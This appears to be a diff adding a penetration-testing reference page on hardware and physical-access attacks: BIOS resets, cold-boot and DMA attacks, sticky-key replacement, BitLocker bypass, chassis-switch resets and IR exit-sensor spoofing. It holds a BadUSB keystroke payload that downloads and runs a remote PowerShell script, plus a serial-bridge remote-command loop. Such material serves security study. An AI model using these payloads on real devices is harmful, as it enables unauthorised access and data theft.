@@ -1,0 +1,157 @@
+---
+title: "Hardware & Physical Access"
+description: "Overview of hardware and physical security testing — BIOS/UEFI attacks, DMA exploitation, BadUSB implants, physical bypass techniques, and kiosk escapes."
+---
+
+Physical access to a device often means complete compromise. This section covers attack techniques and defensive considerations for scenarios where an attacker has physical access to hardware.
+
+<Warning>
+**Physical access = full compromise.** In most cases, if an attacker can physically access a device, all other security controls can be bypassed given sufficient time and resources. Keep devices in physically controlled areas and assume that physical access equals full compromise.
+</Warning>
+
+## BIOS / CMOS Password Recovery
+
+### Hardware Reset
+
+Most motherboards include a CMOS battery that, when removed for approximately 30 minutes, resets all BIOS settings including the password. Alternatively, a **jumper on the motherboard** can be adjusted to reset CMOS by shorting specific pins.
+
+### Software Tools
+
+Boot from a **Live CD/USB** (e.g., Kali Linux) and use:
+- `killCmos` — resets CMOS settings
+- `CmosPWD` — attempts to recover BIOS passwords
+
+### BIOS Error Code Attack
+
+Entering the wrong BIOS password three times typically produces an error code. Submit this code to [https://bios-pw.org](https://bios-pw.org) to retrieve a master password.
+
+## UEFI Security
+
+```bash
+# Use chipsec to analyze and modify UEFI settings
+python chipsec_main.py -module exploits.secure.boot.pk
+```
+
+`chipsec` can assess Secure Boot configuration and check for firmware vulnerabilities.
+
+## RAM Attacks
+
+### Cold Boot Attack
+
+RAM retains data for **1–2 minutes** after power loss. Applying cold substances (liquid nitrogen) can extend this to **10 minutes**, allowing memory dumping with `dd.exe` and analysis with `volatility`.
+
+### DMA Attacks (INCEPTION)
+
+**INCEPTION** performs physical memory manipulation via DMA through **FireWire** or **Thunderbolt** interfaces. It patches memory to accept any password, bypassing login screens.
+
+<Note>
+INITION is ineffective against Windows 10+ systems with kernel DMA protection enabled.
+</Note>
+
+## Live CD / USB System Access
+
+- **Replace sticky-key binaries** — swap `sethc.exe` or `Utilman.exe` with `cmd.exe` from a Live CD to get a SYSTEM-level shell at the login screen
+- **chntpw** — edit the Windows SAM file from Linux to reset/change passwords
+- **Kon-Boot** — temporarily modifies the Windows kernel via UEFI to allow login without a password
+
+## BadUSB / HID Implant Techniques
+
+### Wi-Fi Managed Cable Implants
+
+ESP32-S3-based implants like **Evil Crow Cable Wind** hide inside USB cables and enumerate as a USB keyboard while exposing a Wi-Fi C2 interface:
+
+```bash
+# Connect to the implant's Wi-Fi hotspot, then access the web UI
+# Default SSID: Evil Crow Cable Wind, Password: 123456789
+# UI: http://cable-wind.local/
+
+# Flash new firmware via HTTP (unauthenticated)
+curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
+```
+
+### OS-Aware AutoExec Payloads
+
+HID implants can fingerprint the OS and execute OS-specific payloads:
+
+```powershell
+# Windows payload example
+GUI r
+STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"
+ENTER
+```
+
+### HID-Bootstrapped Remote Shell
+
+```powershell
+# Bootstrap a serial-to-TCP bridge via keystroke injection
+$port = New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
+$port.Open()
+while($true) {
+    $cmd = $port.ReadLine()
+    if($cmd) { Invoke-Expression $cmd }
+}
+```
+
+## BitLocker Bypass
+
+BitLocker encryption can be bypassed if the **recovery password** is found in a memory dump (`MEMORY.DMP`). Tools:
+- **Elcomsoft Forensic Disk Decryptor**
+- **Passware Kit Forensic**
+
+Social engineering can also trick a user into running a command that adds a new recovery key composed of zeros.
+
+## Chassis Intrusion Switch Attack
+
+Many laptops include a chassis-intrusion switch monitored by the Embedded Controller (EC). Vendors sometimes implement undocumented recovery shortcuts:
+
+### Framework 13 Example
+
+```
+Press intrusion switch → hold 2s
+Release               → wait 2s
+Repeat 10 times while powered
+```
+
+After the tenth cycle, the EC wipes NVRAM on next reboot — clearing the supervisor password, Secure Boot keys, and all custom configuration. The whole procedure takes ~40 seconds and requires only a screwdriver.
+
+<Steps>
+  <Step title="Power on or suspend-resume target">Ensure the EC is running.</Step>
+  <Step title="Remove bottom cover">Expose the intrusion/maintenance switch.</Step>
+  <Step title="Reproduce toggle pattern">Follow vendor-specific sequence (consult documentation or reverse-engineer EC firmware).</Step>
+  <Step title="Reboot">Firmware protections should be cleared.</Step>
+  <Step title="Boot Live USB">Perform post-exploitation: credential dumping, data exfiltration, EFI binary implantation.</Step>
+</Steps>
+
+### Mitigation
+
+- Log chassis-intrusion events and correlate with unexpected BIOS resets
+- Use tamper-evident seals on screws/covers
+- Keep devices in physically controlled areas
+- Disable or require cryptographic authorization for maintenance-switch NVRAM resets where possible
+
+## IR Injection Against Exit Sensors
+
+"Wave-to-exit" sensors use a near-IR LED emitter with a receiver that triggers after detecting multiple pulses of the correct carrier (~30 kHz). An attacker can:
+
+1. **Capture** the emission profile using a logic analyzer clipped to controller pins
+2. **Replay** the post-detection waveform with an external IR LED, triggering the relay
+3. **Gate** the transmission in tuned bursts to avoid desensitizing the AGC
+
+Embedding the driver in a commercial flashlight hides the tool in plain sight. A high-power IR LED, ATtiny412 MCU, and MOSFET driver can trigger sensors from ~6 meters away by bouncing IR off walls visible through glass.
+
+## Kiosk / GUI Escape
+
+See the dedicated [Escaping from KIOSKs](#) section for techniques covering:
+
+- Physical interface abuse (USB keyboard, Ethernet)
+- Common dialog exploitation for Explorer access
+- Windows shortcuts and shell URIs
+- Browser-based filesystem access
+- iPad gesture-based escapes
+
+## References
+
+- [Pentest Partners — Framework 13: Press here to pwn](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
+- [FrameWiki — Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
+- [SensePost — Bypassing IR No-Touch Exit Sensors](https://sensepost.com/blog/2025/noooooooooo-touch/)
+- [Mobile-Hacker — Evil Crow Cable Wind](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
